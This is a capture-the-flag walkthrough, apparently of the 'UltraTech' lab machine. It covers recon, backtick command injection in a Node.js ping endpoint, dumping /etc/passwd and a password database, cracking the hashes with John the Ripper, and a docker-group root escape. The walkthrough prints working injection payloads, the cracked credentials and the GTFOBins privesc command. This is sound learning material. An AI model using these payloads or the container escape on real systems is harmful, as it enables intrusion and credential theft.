**Tristan Gomez**

## Recon

I began with a classic nmap scan, using no arguments. I don't usually run very in-depth scans right off-the-bat (i.e. scanning all ports or using -Pn) because it takes quite a bit of time to run, and you don't ususally find anything more. If there is/are only 1 or no services open then I would run a more in-depth scan. Below, we can see that we have four services running. I always like to go for the 'low habing fruit' first to see if there is anything juicy to find.  In this case it'll be checking if anonymous ftp is allowed...
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

ANNNNDDDD anonymous ftp is not allowed. Darn, we will have to do this the hard way. Since we have two web services running, let's enumerate them and see what we find...

Using `gobuster` we find two endpoints. One that we can successfully GET (auth) and the second is a server error (ping). 
```
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
            
```

Exploring `/ping` we get an error when we get to the page. Huh... well I'm not the best at diagnosing these layers of errors, but I have an idea.
At the end of the url is `?ip=`. Let's try to break it by injecting stuff and see what happens... 
```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```


## Gaining a Foothold
You can usually get an idea of what is running on the 'other-side' by
injecting stuff and viewing the response. I am going to put in `'` and `"` to see if I get an error message.

`http://10.10.1.197:8081/ping?ip='` gives the error `/bin/sh: 1: Syntax error: Unterminated quoted string`.

DING DING DING!!! We have something to work with. These commands are being passed to a shell, so let's mess around with it more to see what we can do.

I tried `'pwd'` and `"pwd"` to no avail; however, using backticks like so...
```
http://10.10.1.197:8081/ping?ip=`pwd`
```

Gives me `ping: /home/www/api: Temporary failure in name resolution`. Okay, so now it appears that we have a means to successfully get code execution. Let's leverage this to get some usable info. 

Injecting `ls` gives us the name of the database being used `utech.db.sqlite`. Let's dump the contents of `/etc/passwd` to get part of the information that `john the ripper` needs to crack hashed passwords. Then let's dump `utech.db.sqlite` to get the other half of the data that `john` needs.

`cat /etc/passwd` -> `www:x:1002:1002::/home/www:/bin/sh:`

`cat utech.db.sqlite` -> ` ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded`

Now `john the ripper` to crack the password using `rockyou.txt` as wordlist yields `r00t:n100906` and `admin: mrsheafy`. The admin password appears to be incorrect, but the credentials for `r00t` are valid. Let's ssh in!


## Privesc
First thing that I like to do is check the sudo permissions for the user I login as. 
```
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```

 Well that is a let down... 
 Let's see what our id's are. Maybe there's something interesting.
 ```
 r00t@ultratech-prod:/$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

 ```
 
 Ooooooh, we are part of the docker group. We can probably leverage this. I am going to checkout GTFObins because they are my main source for privesc exploits. Looking at their entries for `docker` we can see that running `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` can break us out of restrictive environments. As you can see below, I tried running the command...
 ```
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).

 ```
  
And, I got errors, no dice this time. Looking into the issue, I can see that `alpine` doesn't exist on the system. I got stuck here because I was very new to docker at the time I attempted this challenge. I decided to look at walkthroughs for this challenge to learn what I was doing wrong. Never be afraid to look at walkthroughs when you get stuck! The entire goal of these problems is to learn, so go out and learn! I've looked at tons of walkthroughs while attempting challenges and they can entirely shift your perspective as to what's possible in the realm of computing. (Okay, soapbox moment over). 

Turns out I just needed to replace `alpine` with `bash` and GG. As you can see, I was able to get root access. Just `cat` the root flag and congrats!
 ```
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
 ```
